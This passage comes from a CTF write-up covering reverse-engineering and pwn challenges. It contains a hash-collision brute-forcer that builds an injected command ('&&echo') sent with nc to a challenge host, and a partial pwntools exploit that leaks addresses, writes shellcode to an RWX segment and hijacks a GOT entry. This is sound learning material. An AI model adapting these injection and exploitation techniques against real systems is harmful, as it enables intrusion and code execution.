            else
                v9 = 20480;
            if ( v6 & 1 )
                v10 = 10240;
            else
                v10 = 0;
            v11 = v8 & 1;
            if ( v8 & 1 )
                v10 = v9;
            if ( v6 & 1 )
                v12 = 20480;
            else
                v12 = 0;
            if ( v6 & 1 )
                v13 = -4095;
            else
                v13 = -24575;
            if ( !v11 )
                v13 = v12;
            v14 = v10 ^ 0xA001;
            if ( !((v13 ^ (v6 >> 2)) & 1) )
                v14 = v10;
            v15 = v14 ^ (v6 >> 3);
            v16 = v14 >> 1;
            if ( v15 & 1 )
                v16 ^= 0xA001u;
            v17 = v16 ^ (v6 >> 4);
            v18 = v16 >> 1;
            if ( v17 & 1 )
                v18 ^= 0xA001u;
            v19 = v18 ^ (v6 >> 5);
            v20 = v18 >> 1;
            if ( v19 & 1 )
                v20 ^= 0xA001u;
            v21 = v20 ^ (v6 >> 6);
            v22 = v20 >> 1;
            if ( v21 & 1 )
                v22 ^= 0xA001u;
            v23 = v22 ^ (v6 >> 7);
            v24 = v22 >> 1;
            if ( v23 & 1 )
                *((short *)&v24) = v24 ^ 0xA001;
            *((short *)v5 + 1) = v24;
            v5 += 2;
        }
        while ( v2 != 256 );
        data[0] = 1;
        if ( result )
        {
    LABEL_3:
            if ( length )
            {
                v3 = &result[length];
                length = 0;
                do
                {
                    v4 = *result++;
                    length = *(unsigned short *)&data[2 * (unsigned char)(v4 ^ length) + 4] ^ (length >> 8);
                }
                while ( result != v3 );
            }
            result = (char *)length;
        }
        return result;
    }
    int main(int argc, char** argv){
        // char* command = "cat flag.txt";
        char* command = argv[1];
        char* password = "L39ZTvwaHegpVb9";
        char* host = "challengebox.reply.it";
        int port = 42763;
        char buffer[0x400] = {0};                 
        unsigned char i = 0;                            
        unsigned char j = 0;
        unsigned char k = 0;
        unsigned int l = 0;
        unsigned short result = 0;
        unsigned short table[] = {
            0xC027, 0x2564, 0x5772, 0xE56C, 0x3A96, 0x462C, 0xDB2E, 0xBB2F
        };
        for(i = 0x20; i<0x80; i++){             
            for(j = 0x20; j<0x80; j++){             
                for(k = 0x20; k<0x80; k++){             
                    sprintf(buffer, "%s&&echo %c%c%c",command,i,j,k);   
                    result = hash(buffer, strlen(buffer));
                    for(l = 0; l<sizeof(table); l++){             
                        if(result == table[l]) {
                            goto FOUND;
                        }
                    }                                     
                }                                     
            }                                     
        }                                     
    FOUND:
        printf("python -c 'print \"%s\\n%s&&echo \\x%02x\\x%02x\\x%02x\\n\"'|nc %s %d", password, command, i, j, k, host, port);
    }
#### BIN 200
The main function consists of lots of if statements like:  
Most of them are useless, but i found some of these if statements judge the
single byte of flag is right or wrongï¼Œsuch as
    if ( (unsigned __int8)(a2[1][16] + 73) != 155 )
        return 0xFFFFFFFFLL;
it checks a byte of flag is right or wrong, so i searched all the if
statements like this and calculate the flag.
#### BIN 300
This is a challenge of architecture gameboy, I am used to use radare2 to
analyze this kind of rev challenges. But I have to do other preparation before
it.
First I google this architecture and then find that it's cpu architecture of
GBA. And It's easily to find relative documents and tools about it, this is
helpful.
I found some emulators to run the rb file on
[emuparadise](https://www.emuparadise.me/Nintendo_Gameboy_Advance_Emulators/31).
What I see is shown below when I run the challenge file with
visualboyadvance-m:  
It's just a picture and seems to be helpless. But we can search the string in
r2 with cmd`izz~R-Boy found this` and find a string at offset 0xa32. I think
the string may lead to sth, so I find reference to that string with`pd
2048~a32`. This command show following asm code:
    |           0x000001c7      cd5a32         call fcn.0000325a
            |   0x000008a6      11320a         ld de, 0x0a32
          ,===< 0x00000a32      2052           jr nZ, 0x52
It's easily to tell that code at 0x8a6 refer to that string. So I seek to that
place ad analyze that function at 0x883
    |           0x000008a6      11320a         ld de, 0x0a32
    |           0x000008a9      d5             push de
    |           0x000008aa      cdf812         call fcn.000012f8
It's easy to know that fcn.000012f8 is a print function by patching the call
and rerun the program in emulator.  
I noticed that there are another 2 references to fcn.000012f8 by typing `axt @
fcn.000012f8`, they are probably going to print flag. So I check them, and
found that call at 0x05a6 take parameter "%c".  
Wow, we may be very close, so I analyze the function at 0x52a, and find
something like check, and after those checks, there is a loop that call
likely`show("%c", b)`:  
we can find that what the "%c" print are bytes which are xor result of a given
string "A|v}\x00m\x09Sh^ewzYR\x0dT\x09eohvG" and another byte from our
joypad's input.  
Since there is only one byte we can bruteforce it and finaly we get the flag:  
`{FLG:W3iRd_M@ch7n3_URL}`
#### BIN 400
At the first look at the program, I'm quite sure it's about protocol reversing
though It's a pwn finally. And after some reverse engineering, I conclude the
operations we can take provided by the program:
    write memory
    read memory
    calculate
        and
        rshift
        xor
        assign
        lshift
        sub
        mul
        or
        add
all these operations are relative to 11 registers on stack. and all operations
are done with those regs, for example the write operation are going to write
address which stored in the memory. There are many details about the protocol
you'd better reverse the program yourself to understand all of them.  
Now we've known we can store any value in our stack registers and then read
and write arbitrary memory, the next to do is to get shell. But before that we
have to solve some problems.
First thing to solve is how to get the memory address we need. Note that, we
have can only send one packet with commands and the server will not give us
any feedback, and the checksec shows:
    Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      PIE enabled
        RWX:      Has RWX segments
That reveals that we can write GOT, we can write shellcode to rwx segment, but
we don't know where the elf is loaded.  
To solve this problem, we can use the first vunerablity of the program, that
is the program doesn't initialize the registers on stack, and addresses we
need can be found there. In fact, we can find address in elf address space and
address in libc space. To use the libc addr I have to dump the libc, but it's
not efficient. But with the elf addr we can calculate address of GOT and
address of RWX segment, then we can write shellcode to rwx segment and modify
fprintf got entry and triger it by appending an invalid command item to our
packet.
The second problem is how we get the output of program since the fd of tcp
connection is dup to a random value? The problem is easy to solve but take me
lots of time because of some accident try. We only need to write a loop in our
shellcode to write content to every fd, It eventually will write flag to our
terminal. So the shellcode need to do follow things:
    open flag.txt
    read flag.txt to buf
    set fd to 4
    tag:
        write to fd
        inc fd
        jmp to tag
(PS: You can't open a shell or do reverse shell binding because the program is
totally based on tcp connection and chroot to user directory)  
Here is full exp:
    from pwn import *
    from time import sleep
    from keystone import *
    from keystone.x86_const import *
    MODE_8 = 0x10
    MODE_16 = 0x8
    MODE_32 = 0
    MODE_64 = 0x18
    MODE_REG = 8
    MODE_IMM = 0
    OP_AND = 0x80
    OP_RSHIFT = 0x70
    OP_XOR = 0xA0
    OP_ASSIGN = 0xB0
    OP_LSHIFT = 0x60
    OP_SUB = 0x10
    OP_MULTIPLE = 0x20
    OP_OR = 0x40
    OP_ADD = 0x00
    def rmt_write(src, dst, offset, mode):
        cmd = 0
        cmd |= 3 # class type
        cmd |= 0x60 # mode
        cmd |= mode # bit mode
        reg = src << 4 | dst # regs
        cmd |= reg << 8
        cmd |= offset << 16 # offset
        return cmd
    def rmt_read(src, dst, offset, mode):
        cmd = 0
        cmd |= 0 # class type
        cmd |= 0x40 # mode
        cmd |= mode # bit mode
        reg = src << 4 | dst # regs
        cmd |= reg << 8
        cmd |= offset << 16 # offset
        return cmd
    def rmt_calc(dst, value, op, mode=MODE_IMM):
        cmd = 0
        cmd |= 7 # class type
        cmd |= mode 
        cmd |= op # op
        cmd |= dst << 8 # dst
        if mode == MODE_IMM:
            cmd |= value << 32 # value
        else:
            cmd |= value << 12 # src
        return cmd
    def pack_cmds(cmds):
        packet = ''
        for cmd in cmds:
            packet += p64(cmd)
        return packet
    cmds = [rmt_write(10, 10, 0, MODE_16)]
    sc_value = []
    context.arch='amd64'
    sc_asm = '''
    xor rdx, rdx
    xor rsi, rsi
    xor rbx, rbx
    push 0
    mov rbx, 0x7478742e67616c66
    push rbx
    mov rbx, rsp
    push rbx
    pop rdi
    mov rax, 2
    syscall
    mov rdi, rax
    mov rsi, rsp
    sub rsi, 0x800
    mov rdx, 0x100
    mov rax, 0
    syscall
    mov rdi, 4
    tag:
    xor rcx, rcx
    mov rax, 1
    syscall
    inc rdi
    jmp tag
    '''
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    shellcode = ''.join(map(lambda c:chr(c), ks.asm(sc_asm)[0]))
    for i in range(0, len(shellcode), 8):
        sc_value.append(u64(shellcode[i:i+8].ljust(8, '\x00')))
    # get elf base at reg4
    leak_item = 7
    cmds.append(rmt_calc(leak_item, 0x555555557333 - 0x555555554000, OP_SUB, MODE_IMM))
    # get rwx base at reg1
    cmds.append(rmt_calc(1, leak_item, OP_ASSIGN, MODE_REG))